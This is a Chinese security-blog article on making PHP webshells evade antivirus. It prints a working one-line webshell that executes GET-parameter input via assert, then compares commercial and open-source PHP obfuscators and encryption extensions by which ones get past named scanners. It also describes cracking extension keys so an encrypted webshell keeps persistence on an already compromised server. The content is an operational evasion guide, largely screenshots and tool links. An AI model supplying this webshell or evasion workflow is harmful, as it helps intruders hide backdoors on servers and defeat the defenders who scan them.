> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/4do1KVwGEv1KM1v4ORr66g)

无扩展免杀
-----

### 1.php加密

这里是利用phpjiami网站进行加密，进而达到加密效果

```
https://www.phpjiami.com/  

```

![图片](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v6ft85M3SpKQLOTL4lXFFRy6I1fQOZojZ9LpOC3ToGUqmqDrqwk5Z0ANo0X2R5oG8Splx7stGlicuQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

加密前：

```
<?php  
session_start();  
$a = "a";  
$s = "s";  
$c=$a.$s."sert";  
$c($_GET["1"]);  
?>  

```

查杀效果

![图片](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v6ft85M3SpKQLOTL4lXFFRyMUCMr6QGibFOiaibGvzfRorrDk9OIy6DYajnEpsJ2CGCK2jDibcU8XmOKQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v6ft85M3SpKQLOTL4lXFFRyiaUf8njRfsw4u6szia11Fz7Ck47gL49ibrZQa1ZKCZMiasn2P83hBHPDWg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

可以看到这里D某和某狗都查杀

里用php加密后效果

![图片](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v6ft85M3SpKQLOTL4lXFFRyUgvBCBSUfIqNzuZesHibhiaxY3ZCdIUuNlDHEzuUiafGX2bydZGjpk4MA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

查杀效果

![图片](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v6ft85M3SpKQLOTL4lXFFRyvOcUqIHjwrKUzvwsMprkwEXazJuBxydV0pVxYg0olHrnm39pvOa6dw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

可以看到这里只有D某会显示加密脚本，而某狗直接绕过

### 2.dezend加密

```
http://dezend.qiling.org/encrypt.html  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

免杀效果

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

可以看到dezend加密的特征还是太过明显

### 3.z5encrypt

```
https://z5encrypt.com/encrypt/build  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

### 4.php-obfuscator

工具下载

```
https://github.com/naneau/php-obfuscator  

```

在线工具

```
https://www.phpobfuscator.cn/  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

不太行

### 5.yakpro-po

工具下载

```
https://github.com/pk-fr/yakpro-po  

```

在线工具

```
https://www.php-obfuscator.com/?demo  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

免杀效果

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

img

并不太行

### 6.phpjm

```
http://www.phpjm.net/encode.html  

```

加密后效果

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

免杀效果![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

### 7.Virbox

工具下载

```
https://shell.virbox.com/apply.html  

```

加密后效果

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

Virbox已经属于是商业源码加密,基本上没有任何特征

但是由于这个是需要将生成好的php-cqi.exe原有的php-cqi.exe才能达到解密的效果，因此只能说作为一个权限维持的方式，先拿到权限后，修改php-cqi.exe，在上这种加密马，作为一个权限维持

加密过程：

```
https://baijiahao.baidu.com/s?id=1671004157804653895&wfr=spider&for=pc  

```

免杀效果

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

### 7.总结

以上总结了webshell加密的工具，其实在非扩展的加密工具中，其原理很多就是混淆变量名和函数名，类名，命名空间等等，可以配合多个加密工具进行多种加密，当然也可以和之前文章的免杀进行结合

扩展免杀
----

由于很多企业为了防止源码泄露，都会使用加密扩展将代码进行加密，那么我们就可以就将计就计，将webshell也利用扩展加密，将特征消除，从而达到免杀的效果

### 1.php-beast

扩展地址

```
https://github.com/liexusong/php-beast  
https://github.com/imaben/php-beast-binaries  

```

下载dll，并添加至ext中

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

在php.ini 中添加该扩展

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

修改configure.ini

```
; source path  
src_path = "C:/Users/12107/Desktop/demo/"  
  
; destination path  
dst_path = "C:/Users/12107/Desktop/demo2/"  
  
; expire time  
expire = "2021-09-08 17:01:20"  
  
; encrypt type  
encrypt_type = "AES"  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

当然也可以不使用默认密钥

在aes_algo_handler.c中可以修改默认密钥

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

当然如果没有密钥其实是无法生成一个能被解析的php文件，因此还需要通过逆向获取dll中的密钥

破解参考：

```
http://www.phpheidong.com/blog/article/337644/71c2cabcc769f99d7808/  

```

### 2.screw_plus

环境搭建

```
https://blog.oioweb.cn/64.html  
https://newsn.net/say/php-screw-plus.html  

```

破解参考：

```
https://www.cnblogs.com/StudyCat/p/11268399.html  

```

### 3.总结

基于扩展的免杀，如果知道密钥，经加密后的webshell是不具备任何特征的，基本上直接通杀。

具体步骤通过phpinfo获取扩展信息，根据不同的加密扩展进行尝试利用默认密钥进行加密，通过访问webshell来判断密钥是否正确，当然，这种方法其实只能用于权限维持需要拿到权限后获取扩展文件破解后，才能稳定获取密钥，进而加密webshell

  

加下方wx，拉你一起进群学习  
  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

往期推荐

[

windows环境下的自保护探究



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247500695&idx=1&sn=ba5ee681ab01b3e33b66d7562d8aaa19&chksm=ce67792bf910f03d5e828822de773c3c82f8f2fc38c2e875f17ffd01d06294ecbea5c618cc2f&scene=21#wechat_redirect)

[

对抗无落地的shellcode注入



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247500063&idx=1&sn=911e115c9c99ea88a582a947737a0cc1&chksm=ce677ba3f910f2b51cce3135c7fa709067498098e9d4b2de5f8df66f8760853d8ce8b74ea978&scene=21#wechat_redirect)

[

什么？你还不会webshell免杀？（二）



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247499857&idx=1&sn=b49ca696334f2161e7311ad625ee84c6&chksm=ce677aedf910f3fb0fa061a7d3b403980dfccb2fc59acf0aec87bb722b90c6715241448cb86c&scene=21#wechat_redirect)

[

内网环境下的横向移动总结



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247499769&idx=1&sn=e52725ea95e63ca860815d26304bf2da&chksm=ce674545f910cc535e5028081bc0c2bdc99fb2040c9d357f1bc15e347b7835e579ea9741e24f&scene=21#wechat_redirect)

[

什么？你还不会webshell免杀？（一）



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247498204&idx=1&sn=6d1196d195193296ac413bc64e5a71c4&chksm=ce674360f910ca763cb59c834b63e7bc010a7020ba4ef06c5be05d0b8f0dbc78b6dd485b451a&scene=21#wechat_redirect)

[

利用卷影拷贝服务提取ntds.dit



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247498091&idx=1&sn=5d3a86dab1bc6d0d97755d67de3e164e&chksm=ce6743d7f910cac115dd184a777cfea6a2a5a7a759d51dfc108b6c75bf1c42aa3ebc4dae07ff&scene=21#wechat_redirect)

[

从mimikatz抓取密码学习攻防



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247497664&idx=1&sn=c63231e4cfca59a548b9d1de4bd66417&chksm=ce674d7cf910c46ac33e994d91486e197ed884461646096a0e4d0eeaf289e7adaf2c8097d7e0&scene=21#wechat_redirect)

[

shellcode编写探究



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247497564&idx=1&sn=e061aea7457034672babe21d307c5a0b&chksm=ce674de0f910c4f66c5c05653005337f7df136b03a757a1549920086d1bbd5467904e59e0ca1&scene=21#wechat_redirect)

  

 ![](http://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v6flNJqwg2VJrVbXvO9N2mzz6piagicPIiaCNPGH1tNA1N43RLy5bLY4PyUqNGYocicJMqrusALD0icibkg/0?wx_fmt=png) ** 红队蓝军 ** 一群热爱网络安全的人，知其黑，守其白。不限于红蓝对抗，web，内网，二进制。 82篇原创内容   公众号

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)